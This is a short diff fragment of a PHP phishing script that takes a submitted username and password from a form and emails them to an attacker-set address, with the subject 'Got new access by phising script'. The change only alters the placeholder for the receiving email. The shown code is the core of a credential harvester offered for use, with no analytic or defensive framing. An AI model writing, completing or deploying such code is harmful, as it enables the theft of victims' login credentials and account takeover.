@@ -3,7 +3,7 @@
 		$username = $POST['username'];
 		$password = $POST['password'];
 		
-		$reciever = "YOUR-EMAIL ADRRESS";
+		$reciever = "YOUR E-MAIL ACCOUNT";
 		
 		$subject = "Got new access by phising script";
 		$message = "The username is ". $username;
